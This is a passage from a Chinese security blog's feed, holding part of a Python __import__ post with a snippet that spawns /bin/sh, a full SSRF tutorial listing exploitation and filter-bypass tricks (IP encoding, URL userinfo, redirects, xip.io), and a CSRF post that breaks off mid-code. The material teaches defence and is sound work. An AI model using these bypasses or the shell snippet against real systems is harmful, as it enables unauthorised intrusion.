data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 或&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__author__ &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1asy&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;em&gt;all&lt;/em&gt;&lt;br /&gt;
 该属性不是模块默认的，需要手动定义，它的功能有二：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;记录一个模块有哪些重要的、对外开发的类、方法或变量等，或记录一个包哪些对外开放的模块；&lt;/p&gt;
&lt;p&gt;限制导入，当使用 &lt;code&gt;“from xxx import *”&lt;/code&gt;  形式导入时，实际导入的只有__all__属性中的同名的对象而不是所有，但对于 &lt;code&gt;“from xxx import xxx”&lt;/code&gt;  指定了具体的名字则 all 属性被忽略。&lt;/p&gt;
&lt;h2 id=&#34;魔法方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#魔法方法&#34;&gt;#&lt;/a&gt; 魔法方法&lt;/h2&gt;
&lt;h3 id=&#34;_import_&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#_import_&#34;&gt;#&lt;/a&gt; _&lt;em&gt;import&lt;/em&gt;_&lt;/h3&gt;
&lt;p&gt;该魔法方法是 import 触发，即 &lt;code&gt;import os &lt;/code&gt; 相当于 &lt;code&gt;os = __import__(&#39;os&#39;)&lt;/code&gt; ，也可以直接使用，主要用于模块延迟加载，或重载模块。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;参数：&lt;/span&gt;&lt;br /&gt;
name: 模块的名字；&lt;br /&gt;
global: 包含全局变量的字典，采用默认值 global ()&lt;br /&gt;
 local: 包含局部变量的字典，采用默认值 local ()&lt;br /&gt;
 fromlist: 被导入的子模块的名称&lt;br /&gt;
 level: 指定使用绝对导入还是相对导入，0 表示只执行绝对导入。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;实例&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这段代码能在 Linux 下调用 shell&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;loader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;__import__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token builtin&#34;&gt;getattr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    loader&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;os&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;system&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;/bin/sh&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;__import__函数返回的是一个变量，代表一个模块，所有后续方法的调用都要在这个变量的基础上。&lt;/p&gt;
&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s&#34;&gt;https://www.cnblogs.com/cwp-bg/p/9856339.html&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="python" scheme="https://self-ferry.github.io/categories/python/" />
        <category term="python内置属性" scheme="https://self-ferry.github.io/tags/python%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/" />
        <updated>2021-02-05T12:59:31.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-SSRF/</id>
        <title>web漏洞-SSRF</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-SSRF/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️嘘，请安静&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=1355292203&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;ssrf的定义与成因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf的定义与成因&#34;&gt;#&lt;/a&gt; SSRF 的定义与成因&lt;/h1&gt;
&lt;p&gt;SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）&lt;/p&gt;
&lt;p&gt;SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。&lt;/p&gt;
&lt;p&gt;注释：除了 http/https 等方式可以造成 ssrf，类似 tcp connect 方式也可以探测内网一些 ip 的端口是否开发服务，只不过危害比较小而已。&lt;/p&gt;
&lt;h1 id=&#34;可能出现的地方&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可能出现的地方&#34;&gt;#&lt;/a&gt; 可能出现的地方&lt;/h1&gt;
&lt;p&gt;1. 社交分享功能：获取超链接的标题等内容进行显示&lt;/p&gt;
&lt;p&gt;2. 转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览&lt;/p&gt;
&lt;p&gt;3. 在线翻译：给网址翻译对应网页的内容&lt;/p&gt;
&lt;p&gt;4. 图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片&lt;/p&gt;
&lt;p&gt;5. 图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验&lt;/p&gt;
&lt;p&gt;6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试&lt;/p&gt;
&lt;p&gt;7. 网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作&lt;/p&gt;
&lt;p&gt;8. 数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数&lt;/p&gt;
&lt;p&gt;9. 邮件系统：比如接收邮件服务器地址&lt;/p&gt;
&lt;p&gt;10. 编码处理，属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等&lt;/p&gt;
&lt;p&gt;11. 未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞&lt;/p&gt;
&lt;p&gt;一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……&lt;/p&gt;
&lt;p&gt;12. 从远程服务器请求资源（upload from url 如 discuz！；import &amp;amp; expost rss feed 如 web blog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）&lt;/p&gt;
&lt;h1 id=&#34;漏洞验证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞验证&#34;&gt;#&lt;/a&gt; 漏洞验证&lt;/h1&gt;
&lt;p&gt;1. 排除法：浏览器 f12 查看源代码看是否是在本地进行了请求&lt;/p&gt;
&lt;p&gt;比如：该资源地址类型为  &lt;code&gt;http://www.xxx.com/a.php?image=（地址）&lt;/code&gt; 的就可能存在 SSRF 漏洞&lt;/p&gt;
&lt;p&gt;2.dnslog 等工具进行测试，看是否被访问&lt;/p&gt;
&lt;p&gt;-- 可以在盲打后台用例中将当前准备请求的 uri 和参数编码成 base64，这样盲打后台解码后就知道是哪台机器哪个 cgi 触发的请求。&lt;/p&gt;
&lt;p&gt;3. 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在 HTTP 服务的内网地址&lt;/p&gt;
&lt;p&gt;-- 从漏洞平台中的历史漏洞寻找泄漏的存在 web 应用内网地址&lt;/p&gt;
&lt;p&gt;-- 通过二级域名暴力猜解工具模糊猜测内网地址&lt;/p&gt;
&lt;p&gt;4. 直接返回的 Banner、title、content 等信息&lt;/p&gt;
&lt;p&gt;5. 留意 bool 型 SSRF&lt;/p&gt;
&lt;h1 id=&#34;利用方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用方式&#34;&gt;#&lt;/a&gt; 利用方式&lt;/h1&gt;
&lt;p&gt;1. 让服务端去访问相应的网址&lt;/p&gt;
&lt;p&gt;2. 让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的 cms&lt;/p&gt;
&lt;p&gt;3. 可以使用 file、dict、gopher [11]、ftp 协议进行请求访问相应的文件&lt;/p&gt;
&lt;p&gt;4. 攻击内网 web 应用（可以向内部任意主机的任意端口发送精心构造的数据包 {payload}）&lt;/p&gt;
&lt;p&gt;5. 攻击内网应用程序（利用跨协议通信技术）&lt;/p&gt;
&lt;p&gt;6. 判断内网主机是否存活：方法是访问看是否有端口开放&lt;/p&gt;
&lt;p&gt;7.DoS 攻击（请求大文件，始终保持连接 keep-alive always）&lt;/p&gt;
&lt;h1 id=&#34;绕过限制方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过限制方法&#34;&gt;#&lt;/a&gt; 绕过限制方法&lt;/h1&gt;
&lt;p&gt;详细绕过参考 -----&amp;gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=&#34;&gt;https://www.secpulse.com/archives/65832.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1. &lt;code&gt;http://xxxx.com@www.baidu.com/&lt;/code&gt;  与 &lt;code&gt;http://www.baidu.com/&lt;/code&gt;  请求时是相同的&lt;/p&gt;
&lt;p&gt;2. 各种 IP 地址的进制转换&lt;/p&gt;
&lt;p&gt;可以是十六进制，八进制等。&lt;br /&gt;
115.239.210.26  &amp;gt;&amp;gt;&amp;gt;  16373751032&lt;br /&gt;
 首先把这四段数字给分别转成 16 进制，结果：73 ef d2 1a&lt;br /&gt;
 然后把 73efd21a 这十六进制一起转换成 8 进制&lt;br /&gt;
记得访问的时候加 0 表示使用八进制 (可以是一个 0 也可以是多个 0 跟 XSS 中多加几个 0 来绕过过滤一样)，十六进制加 0x&lt;/p&gt;
&lt;p&gt;127.0.0.1 =&amp;gt; 2130706433&lt;br /&gt;
&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3.URL 跳转绕过： &lt;code&gt;http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;4. 短网址绕过  &lt;code&gt;http://t.cn/RwbLKDx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;短网址原理请参考&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy52ZXJ5aXRtYW4uY29tLzIwMTkvMTEvMjQvJUU3JTlGJUFEJUU1JTlDJUIwJUU1JTlEJTgwJUU1JThFJTlGJUU3JTkwJTg2Lw==&#34;&gt; http://www.veryitman.com/2019/11/24 / 短地址原理 /&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;5.xip.io 来绕过： &lt;code&gt;http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;指向任意 ip 的域名：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3hpcC5pbw==&#34;&gt;xip.io&lt;/span&gt; (37signals 开发实现的定制 DNS 服务)&lt;/p&gt;
&lt;p&gt;6. 限制了子网段，可以加 :80 端口绕过。 &lt;code&gt;http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;7. 探测内网域名，或者将自己的域名解析到内网 ip&lt;/p&gt;
&lt;p&gt;8. 例如  &lt;code&gt;http://10.153.138.81/ts.php&lt;/code&gt;  , 修复时容易出现的获取 host 时以 / 分割来确定 host，&lt;/p&gt;
&lt;p&gt;但这样可以用  &lt;code&gt;http://abc@10.153.138.81/&lt;/code&gt;  绕过&lt;/p&gt;
&lt;p&gt;9. 利用 Enclosed alphanumerics&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &amp;gt;&amp;gt;&amp;gt;  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;漏洞示例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞示例&#34;&gt;#&lt;/a&gt; 漏洞示例&lt;/h1&gt;
&lt;p&gt;1.Wordpress3.5.1 以下版本 xmlrpc.php pingback 的缺陷与 ssrf&lt;/p&gt;
&lt;p&gt;2.discuz！的 ssrf （利用 php 的 header 函数来绕过，其实就是 302 跳转实现协议转换）&lt;/p&gt;
&lt;p&gt;3.weblogic 的 ssrf&lt;/p&gt;
&lt;p&gt;.....&lt;/p&gt;
&lt;h1 id=&#34;漏洞修复&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞修复&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h1&gt;
&lt;p&gt;1. 禁止跳转&lt;/p&gt;
&lt;p&gt;2. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。&lt;/p&gt;
&lt;p&gt;3. 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引起的问题&lt;/p&gt;
&lt;p&gt;4. 设置 URL 白名单或者限制内网 IP（使用 gethostbyname () 判断是否为内网 IP）&lt;/p&gt;
&lt;p&gt;5. 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090&lt;/p&gt;
&lt;p&gt;6. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。&lt;/p&gt;
&lt;h1 id=&#34;reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjExNQ==&#34;&gt;https://xz.aliyun.com/t/2115&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2JvYmFvLjM2MC5jbi9sZWFybmluZy9kZXRhaWwvMjQwLmh0bWw=&#34;&gt;http://bobao.360.cn/learning/detail/240.html&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=&#34;&gt;https://www.secpulse.com/archives/65832.html&lt;/span&gt;&lt;/p&gt;
</content>
        <category term="web安全" scheme="https://self-ferry.github.io/categories/web-security/" />
        <category term="SSRF" scheme="https://self-ferry.github.io/tags/SSRF/" />
        <updated>2021-02-01T11:54:22.000Z</updated>
    </entry>
    <entry>
        <id>https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-CSRF/</id>
        <title>web漏洞-CSRF</title>
        <link rel="alternate" href="https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-CSRF/"/>
        <content type="html">&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;✔️嘘，请安静&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;media-container&#34;&gt;&lt;div class=&#34;player&#34; data-type=&#34;audio&#34; data-src=&#39;[{&#34;title&#34;:&#34;列表 1&#34;,&#34;list&#34;:[&#34;https://music.163.com/#/song?id=1334246005&#34;]}]&#39;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;csrf概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf概念&#34;&gt;#&lt;/a&gt; CSRF 概念&lt;/h1&gt;
&lt;p&gt;CSRF 跨站点请求伪造 (Cross—Site Request Forgery)，跟 XSS 攻击一样，存在巨大的危害性，你可以这样来理解：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中 Web A 为存在 CSRF 漏洞的网站，Web B 为攻击者构建的恶意网站，User C 为 Web A 网站的合法用户。尽管听起来跟 XSS 跨站脚本攻击有点相似，但事实上 CSRF 与 XSS 差别很大，XSS 利用的是站点内的信任用户，而 CSRF 则是通过伪装来自受信任用户的请求来利用受信任的网站。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;csrf攻击示意图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf攻击示意图&#34;&gt;#&lt;/a&gt; CSRF 攻击示意图&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;首先用户 C 浏览并登录了受信任站点 A；&lt;br /&gt;
登录信息验证通过以后，站点 A 会在返回给浏览器的信息中带上已登录的 cookie，cookie 信息会在浏览器端保存一定时间（根据服务端设置而定）；&lt;br /&gt;
完成这一步以后，用户在没有登出（清除站点 A 的 cookie）站点 A 的情况下，访问恶意站点 B；&lt;br /&gt;
这时恶意站点 B 的某个页面向站点 A 发起请求，而这个请求会带上浏览器端所保存的站点 A 的 cookie；&lt;br /&gt;
站点 A 根据请求所带的 cookie，判断此请求为用户 C 所发送的。&lt;br /&gt;
因此，站点 A 会报据用户 C 的权限来处理恶意站点 B 所发起的请求，而这个请求可能以用户 C 的身份发送 邮件、短信、消息，以及进行转账支付等操作，这样恶意站点 B 就达到了伪造用户 C 请求站点 A 的目的。&lt;br /&gt;
受害者只需要做下面两件事情，攻击者就能够完成 CSRF 攻击：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;登录受信任站点 A，并在本地生成 cookie；&lt;/li&gt;
&lt;li&gt;在不登出站点 A（清除站点 A 的 cookie）的情况下，访问恶意站点 B。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;很多情况下所谓的恶意站点，很有可能是一个存在其他漏洞（如 XSS）的受信任且被很多人访问的站点，这样，普通用户可能在不知不觉中便成为了受害者。&lt;/p&gt;
&lt;h1 id=&#34;csrf漏洞检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf漏洞检测&#34;&gt;#&lt;/a&gt; CSRF 漏洞检测：&lt;/h1&gt;
&lt;p&gt;检测 CSRF 漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。&lt;/p&gt;
&lt;p&gt;随着对 CSRF 漏洞研究的不断深入，不断涌现出一些专门针对 CSRF 漏洞进行检测的工具，如 CSRFTester，CSRF Request Builder 等。&lt;/p&gt;
&lt;p&gt;以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。&lt;/p&gt;
&lt;p&gt;客户端访问服务器时没有同服务器做安全验证&lt;/p&gt;
&lt;p&gt;一切 http 参数可控&lt;/p&gt;
&lt;p&gt;详细 CSRF 检测见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTAxMTIyL2FydGljbGUvZGV0YWlscy8xMDY0MDg3MTQ=&#34;&gt; https://blog.csdn.net/qq_41901122/article/details/106408714&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;防御csrf攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御csrf攻击&#34;&gt;#&lt;/a&gt; 防御 CSRF 攻击&lt;/h1&gt;
&lt;h2 id=&#34;尽量使用post限制get&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#尽量使用post限制get&#34;&gt;#&lt;/a&gt; 尽量使用 POST，限制 GET&lt;/h2&gt;
&lt;p&gt;GET 接口太容易被拿来做 CSRF 攻击，看上面示例就知道，只要构造一个 img 标签，而 img 标签又是不能过滤的数据。接口最好限制为 POST 使用，GET 则无效，降低攻击风险。&lt;br /&gt;
当然 POST 并不是万无一失，攻击者只要构造一个 form 就可以，但需要在第三方页面做，这样就增加暴露的可能性。&lt;/p&gt;
&lt;h2 id=&#34;将cookie设置为httponly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#将cookie设置为httponly&#34;&gt;#&lt;/a&gt; 将 cookie 设置为 HttpOnly&lt;/h2&gt;
&lt;p&gt;CRSF 攻击很大程度上是利用了浏览器的 cookie，为了防止站内的 XSS 漏洞盗取 cookie, 需要在 cookie 中设置 “HttpOnly” 属性，这样通过程序（如 JavaScript 脚本、Applet 等）就无法读取到 cookie 信息，避免了攻击者伪造 cookie 的情况出现。&lt;br /&gt;
在 Java 的 Servlet 的 API 中设置 cookie 为 HttpOnly 的代码如下：&lt;br /&gt;
 &lt;code&gt;response.setHeader( &amp;quot;Set-Cookie&amp;quot;, &amp;quot;cookiename=cookievalue;HttpOnly&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;增加token&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#增加token&#34;&gt;#&lt;/a&gt; 增加 token&lt;/h2&gt;
&lt;p&gt;CSRF 攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于 cookie 中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的 cookie 来通过安全验证。由此可知，抵御 CSRF 攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信总不存在于 cookie 之中。鉴于此，系统开发人员可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务端进行 token 校验，如果请求中没有 token 或者 token 内容不正确，则认为是 CSRF 攻击而拒绝该请求。&lt;br /&gt;
假设请求通过 POST 方式提交，则可以在相应的表单中增加一个隐藏域：&lt;br /&gt;
 &lt;code&gt;&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;_toicen&amp;quot; value=&amp;quot;tokenvalue&amp;quot;/&amp;gt;&lt;/code&gt; &lt;br /&gt;
token 的值通过服务端生成，表单提交后 token 的值通过 POST 请求与参数一同带到服务端，每次会话可以使用相同的 token，会话过期，则 token 失效，攻击者因无法获取到 token，也就无法伪造请求。&lt;br /&gt;
在 session 中添加 token 的实现代码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HttpSession session &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getSession&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword type-declaration&#34;&gt;Object&lt;/span&gt; token &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; session&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;_token&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;token &lt;span class=&#34;token 